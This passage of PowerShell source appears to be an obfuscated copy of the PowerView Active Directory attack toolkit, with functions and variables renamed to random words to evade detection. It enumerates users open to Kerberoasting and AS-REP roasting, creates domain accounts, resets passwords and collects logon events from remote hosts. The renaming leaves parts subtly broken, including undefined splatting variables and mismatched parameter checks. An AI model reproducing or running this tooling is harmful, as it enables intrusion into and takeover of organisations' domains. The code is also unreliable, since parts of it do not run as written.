        $nihwcVco99 = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')
        $jiTKeKNG99 = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')
        $rECGWYqZ99 = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')
        $PPosolen99 = @{}
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['LDAPFilter']) { $PPosolen99['LDAPFilter'] = $HOOTOEqu99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $uPNxUikB99 = debater -Domain $SSNUOPgW99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $uPNxUikB99 = debater -Domain $SSNUOPgW99 -Credential $gxazvivN99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[framer] Enumerated forest '$uPNxUikB99' for target domain '$SSNUOPgW99'"
        }
        $bKAVLSff99 = @{}
        if ($PSBoundParameters['Credential']) { $bKAVLSff99['Credential'] = $gxazvivN99 }
        if ($uPNxUikB99) {
            $bKAVLSff99['Forest'] = $uPNxUikB99
        }
    }
    PROCESS {
        if ($PSBoundParameters['ReferencePropertySet']) {
            Write-Verbose "[framer] Using specified -ReferencePropertySet"
            $xcBepLig99 = $CcOGhxIw99
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
            Write-Verbose "[framer] Extracting property names from -ReferenceObject to use as the reference property set"
            $xcBepLig99 = Get-Member -InputObject $GmmvNchI99 -MemberType NoteProperty | Select-Object -Expand Name
            $hjRkFZSH99 = $GmmvNchI99.objectclass | Select-Object -Last 1
            Write-Verbose "[framer] Calculated ReferenceObjectClass : $hjRkFZSH99"
        }
        else {
            Write-Verbose "[framer] Using the default reference property set for the object class '$xwoRVUyD99'"
        }
        if (($xwoRVUyD99 -eq 'User') -or ($hjRkFZSH99 -eq 'User')) {
            $SXgZNvub99 = township @SearcherArguments
            if (-not $xcBepLig99) {
                $xcBepLig99 = $nihwcVco99
            }
        }
        elseif (($xwoRVUyD99 -eq 'Group') -or ($hjRkFZSH99 -eq 'Group')) {
            $SXgZNvub99 = burlap @SearcherArguments
            if (-not $xcBepLig99) {
                $xcBepLig99 = $jiTKeKNG99
            }
        }
        elseif (($xwoRVUyD99 -eq 'Computer') -or ($hjRkFZSH99 -eq 'Computer')) {
            $SXgZNvub99 = doubtlessly @SearcherArguments
            if (-not $xcBepLig99) {
                $xcBepLig99 = $rECGWYqZ99
            }
        }
        else {
            throw "[framer] Invalid class: $xwoRVUyD99"
        }
        ForEach ($Object in $SXgZNvub99) {
            $yqsVbWpr99 = Get-Member -InputObject $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($lmxrXBry99 in $yqsVbWpr99) {
                if ($xcBepLig99 -NotContains $lmxrXBry99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
                    $Out | Add-Member Noteproperty 'Property' $lmxrXBry99
                    $Out | Add-Member Noteproperty 'Value' $Object.$lmxrXBry99
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $Out
                }
            }
        }
    }
}
function township {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $BfpbWwpi99,
        [Switch]
        $SPN,
        [Switch]
        $wfGmLtet99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $XHXWJfxF99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $sIuAAnvX99,
        [Switch]
        $cfgWMxwo99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $xwvOnvpy99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $tmZARvdq99,
        [Switch]
        $rPozaKft99,
        [Alias('ReturnOne')]
        [Switch]
        $QtcSidjx99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $aButQqsr99 = [Enum]::GetNames($oqUiXgaF99)
        $aButQqsr99 = $aButQqsr99 | ForEach-Object {$_; "NOT_$_"}
        coup -Name UACFilter -ValidateSet $aButQqsr99 -Type ([array])
    }
    BEGIN {
        $PPosolen99 = @{}
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        $llxUonve99 = watersides @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            coup -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($llxUonve99) {
            $afFJXkRc99 = ''
            $kXbEpVCq99 = ''
            $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
                $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($QghnbJOP99 -match '^S-1-') {
                    $afFJXkRc99 += "(objectsid=$QghnbJOP99)"
                }
                elseif ($QghnbJOP99 -match '^CN=') {
                    $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[township] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
                        $PPosolen99['Domain'] = $BvhyhWZG99
                        $llxUonve99 = watersides @SearcherArguments
                        if (-not $llxUonve99) {
                            Write-Warning "[township] Unable to retrieve domain searcher for '$BvhyhWZG99'"
                        }
                    }
                }
                elseif ($QghnbJOP99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $DwsqqDxI99 = (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
                }
                elseif ($QghnbJOP99.Contains('\')) {
                    $TzefbTEv99 = $QghnbJOP99.Replace('\28', '(').Replace('\29', ')') | kinsman -OutputType Canonical
                    if ($TzefbTEv99) {
                        $ojqqfkye99 = $TzefbTEv99.SubString(0, $TzefbTEv99.IndexOf('/'))
                        $IsWOPBva99 = $QghnbJOP99.Split('\')[1]
                        $afFJXkRc99 += "(samAccountName=$IsWOPBva99)"
                        $PPosolen99['Domain'] = $ojqqfkye99
                        Write-Verbose "[township] Extracted domain '$ojqqfkye99' from '$QghnbJOP99'"
                        $llxUonve99 = watersides @SearcherArguments
                    }
                }
                else {
                    $afFJXkRc99 += "(samAccountName=$QghnbJOP99)"
                }
            }
            if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
                $kXbEpVCq99 += "(|$afFJXkRc99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[township] Searching for non-null service principal names'
                $kXbEpVCq99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[township] Searching for users who can be delegated'
                $kXbEpVCq99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[township] Searching for users who are sensitive and not trusted for delegation'
                $kXbEpVCq99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[township] Searching for adminCount=1'
                $kXbEpVCq99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[township] Searching for users that are trusted to authenticate for other principals'
                $kXbEpVCq99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[township] Searching for user accounts that do not require kerberos preauthenticate'
                $kXbEpVCq99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[township] Using additional LDAP filter: $HOOTOEqu99"
                $kXbEpVCq99 += "$HOOTOEqu99"
            }
            $RWjhpIuk99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $aHFybRCW99 = $_.Substring(4)
                    $FXxXILfT99 = [Int]($oqUiXgaF99::$aHFybRCW99)
                    $kXbEpVCq99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$FXxXILfT99))"
                }
                else {
                    $FXxXILfT99 = [Int]($oqUiXgaF99::$_)
                    $kXbEpVCq99 += "(userAccountControl:1.2.840.113556.1.4.803:=$FXxXILfT99)"
                }
            }
            $llxUonve99.filter = "(&(samAccountType=805306368)$kXbEpVCq99)"
            Write-Verbose "[township] filter string: $($llxUonve99.filter)"
            if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $llxUonve99.FindOne() }
            else { $pfqXXMQd99 = $llxUonve99.FindAll() }
            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = Buddy -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($pfqXXMQd99) {
                try { $pfqXXMQd99.dispose() }
                catch {
                    Write-Verbose "[township] Error disposing of the Results object: $_"
                }
            }
            $llxUonve99.dispose()
        }
    }
}
function jam {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $xjbZUAHW99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $MOHGouiL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $LyNjMZjk99,
        [ValidateNotNullOrEmpty()]
        [String]
        $zdmbPkzH99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    $cqurrley99 = @{
        'Identity' = $xjbZUAHW99
    }
    if ($PSBoundParameters['Domain']) { $cqurrley99['Domain'] = $SSNUOPgW99 }
    if ($PSBoundParameters['Credential']) { $cqurrley99['Credential'] = $gxazvivN99 }
    $JBFcwhcg99 = Piedmont @ContextArguments
    if ($JBFcwhcg99) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($JBFcwhcg99.Context)
        $User.SamAccountName = $JBFcwhcg99.Identity
        $mtbkfkil99 = New-Object System.Management.Automation.PSCredential('a', $MOHGouiL99)
        $User.SetPassword($mtbkfkil99.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False
        if ($PSBoundParameters['Name']) {
            $User.Name = $Name
        }
        else {
            $User.Name = $JBFcwhcg99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $User.DisplayName = $LyNjMZjk99
        }
        else {
            $User.DisplayName = $JBFcwhcg99.Identity
        }
        if ($PSBoundParameters['Description']) {
            $User.Description = $zdmbPkzH99
        }
        Write-Verbose "[jam] Attempting to create user '$xjbZUAHW99'"
        try {
            $Null = $User.Save()
            Write-Verbose "[jam] User '$xjbZUAHW99' successfully created"
            $User
        }
        catch {
            Write-Warning "[jam] Error creating user '$xjbZUAHW99' : $_"
        }
    }
}
function unseemly {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $BfpbWwpi99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $MOHGouiL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    $cqurrley99 = @{ 'Identity' = $BfpbWwpi99 }
    if ($PSBoundParameters['Domain']) { $cqurrley99['Domain'] = $SSNUOPgW99 }
    if ($PSBoundParameters['Credential']) { $cqurrley99['Credential'] = $gxazvivN99 }
    $JBFcwhcg99 = Piedmont @ContextArguments
    if ($JBFcwhcg99) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($JBFcwhcg99.Context, $BfpbWwpi99)
        if ($User) {
            Write-Verbose "[unseemly] Attempting to set the password for user '$BfpbWwpi99'"
            try {
                $mtbkfkil99 = New-Object System.Management.Automation.PSCredential('a', $MOHGouiL99)
                $User.SetPassword($mtbkfkil99.GetNetworkCredential().Password)
                $Null = $User.Save()
                Write-Verbose "[unseemly] Password for user '$BfpbWwpi99' successfully reset"
            }
            catch {
                Write-Warning "[unseemly] Error setting password for user '$BfpbWwpi99' : $_"
            }
        }
        else {
            Write-Warning "[unseemly] Unable to find user '$BfpbWwpi99'"
        }
    }
}
function niftiest {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $VrEmrUHq99 = $Env:COMPUTERNAME,
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CtVXbzbF99 = [DateTime]::Now.AddDays(-1),
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $FVDtcdtR99 = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $OoLNhUlP99 = 5000,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $suepzcTB99 = @"
<QueryList>
    <Query Id="0" Path="Security">
        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($CtVXbzbF99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($FVDtcdtR99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>
        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($CtVXbzbF99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($FVDtcdtR99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>
        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $mMveqDsv99 = @{
            'FilterXPath' = $suepzcTB99
            'LogName' = 'Security'
            'MaxEvents' = $OoLNhUlP99
        }
        if ($PSBoundParameters['Credential']) { $mMveqDsv99['Credential'] = $gxazvivN99 }
    }
    PROCESS {
        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
            $mMveqDsv99['ComputerName'] = $cXOPCAwl99
            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $SdzJuWMG99 = $Event.Properties
                Switch ($Event.Id) {
                    4624 {
                        if(-not $SdzJuWMG99[5].Value.EndsWith('$')) {
                            $ERfozkEO99 = New-Object PSObject -Property @{
                                ComputerName              = $cXOPCAwl99
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $SdzJuWMG99[0].Value.ToString()
                                SubjectUserName           = $SdzJuWMG99[1].Value
                                SubjectDomainName         = $SdzJuWMG99[2].Value
                                SubjectLogonId            = $SdzJuWMG99[3].Value
                                TargetUserSid             = $SdzJuWMG99[4].Value.ToString()
                                TargetUserName            = $SdzJuWMG99[5].Value
                                TargetDomainName          = $SdzJuWMG99[6].Value
                                TargetLogonId             = $SdzJuWMG99[7].Value
                                LogonType                 = $SdzJuWMG99[8].Value
                                LogonProcessName          = $SdzJuWMG99[9].Value
                                AuthenticationPackageName = $SdzJuWMG99[10].Value
                                WorkstationName           = $SdzJuWMG99[11].Value
                                LogonGuid                 = $SdzJuWMG99[12].Value
                                TransmittedServices       = $SdzJuWMG99[13].Value
                                LmPackageName             = $SdzJuWMG99[14].Value
                                KeyLength                 = $SdzJuWMG99[15].Value
                                ProcessId                 = $SdzJuWMG99[16].Value
                                ProcessName               = $SdzJuWMG99[17].Value
                                IpAddress                 = $SdzJuWMG99[18].Value
                                IpPort                    = $SdzJuWMG99[19].Value
                                ImpersonationLevel        = $SdzJuWMG99[20].Value
                                RestrictedAdminMode       = $SdzJuWMG99[21].Value
                                TargetOutboundUserName    = $SdzJuWMG99[22].Value
                                TargetOutboundDomainName  = $SdzJuWMG99[23].Value
                                VirtualAccount            = $SdzJuWMG99[24].Value
                                TargetLinkedLogonId       = $SdzJuWMG99[25].Value
                                ElevatedToken             = $SdzJuWMG99[26].Value
                            }
                            $ERfozkEO99.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $ERfozkEO99
                        }
                    }
                    4648 {
                        if((-not $SdzJuWMG99[5].Value.EndsWith('$')) -and ($SdzJuWMG99[11].Value -match 'taskhost\.exe')) {
                            $ERfozkEO99 = New-Object PSObject -Property @{
                                ComputerName              = $cXOPCAwl99
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $SdzJuWMG99[0].Value.ToString()
                                SubjectUserName   = $SdzJuWMG99[1].Value
                                SubjectDomainName = $SdzJuWMG99[2].Value
                                SubjectLogonId    = $SdzJuWMG99[3].Value
                                LogonGuid         = $SdzJuWMG99[4].Value.ToString()
                                TargetUserName    = $SdzJuWMG99[5].Value
                                TargetDomainName  = $SdzJuWMG99[6].Value
                                TargetLogonGuid   = $SdzJuWMG99[7].Value
                                TargetServerName  = $SdzJuWMG99[8].Value
                                TargetInfo        = $SdzJuWMG99[9].Value
                                ProcessId         = $SdzJuWMG99[10].Value
                                ProcessName       = $SdzJuWMG99[11].Value
                                IpAddress         = $SdzJuWMG99[12].Value
                                IpPort            = $SdzJuWMG99[13].Value
                            }
                            $ERfozkEO99.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $ERfozkEO99
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}
function fault {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}
    $OWRXcbAe99 = @{}
    if ($PSBoundParameters['Credential']) { $OWRXcbAe99['Credential'] = $gxazvivN99 }
    try {
        $GXpegEIL99 = (ampere @ForestArguments).schema.name
    }
    catch {
        throw '[fault] Error in retrieving forest schema path from ampere'
    }
    if (-not $GXpegEIL99) {
        throw '[fault] Error in retrieving forest schema path from ampere'
    }
    $PPosolen99 = @{
        'SearchBase' = $GXpegEIL99
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
    if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
    if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
    if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
    $cUkPcIDK99 = watersides @SearcherArguments
    if ($cUkPcIDK99) {
        try {
            $pfqXXMQd99 = $cUkPcIDK99.FindAll()
            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($pfqXXMQd99) {
                try { $pfqXXMQd99.dispose() }
                catch {
                    Write-Verbose "[fault] Error disposing of the Results object: $_"
                }
            }
            $cUkPcIDK99.dispose()
        }
        catch {
            Write-Verbose "[fault] Error in building GUID map: $_"
        }
    }
    $PPosolen99['SearchBase'] = $GXpegEIL99.replace('Schema','Extended-Rights')
    $PPosolen99['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $QGxkKYIV99 = watersides @SearcherArguments
    if ($QGxkKYIV99) {
        try {
            $pfqXXMQd99 = $QGxkKYIV99.FindAll()
            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($pfqXXMQd99) {
                try { $pfqXXMQd99.dispose() }
                catch {
                    Write-Verbose "[fault] Error disposing of the Results object: $_"
                }
            }
            $QGxkKYIV99.dispose()
        }
        catch {
            Write-Verbose "[fault] Error in building GUID map: $_"
        }
    }
    $GUIDs
}
function doubtlessly {
    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $BfpbWwpi99,
        [Switch]
        $DZNONYED99,
        [Switch]
        $cfgWMxwo99,
        [Switch]
        $dJaVBXfR99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,
        [ValidateNotNullOrEmpty()]
        [String]
        $wSsSBiPZ99,
        [ValidateNotNullOrEmpty()]
        [String]
        $qoqQUCpy99,
        [ValidateNotNullOrEmpty()]
        [String]
        $nqApdsmI99,
        [Switch]
        $Ping,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $tmZARvdq99,
        [Switch]
        $rPozaKft99,
        [Alias('ReturnOne')]
        [Switch]
        $QtcSidjx99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $aButQqsr99 = [Enum]::GetNames($oqUiXgaF99)
        $aButQqsr99 = $aButQqsr99 | ForEach-Object {$_; "NOT_$_"}
        coup -Name UACFilter -ValidateSet $aButQqsr99 -Type ([array])
    }
    BEGIN {
        $PPosolen99 = @{}
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        $fTlnGmRy99 = watersides @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            coup -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($fTlnGmRy99) {
            $afFJXkRc99 = ''
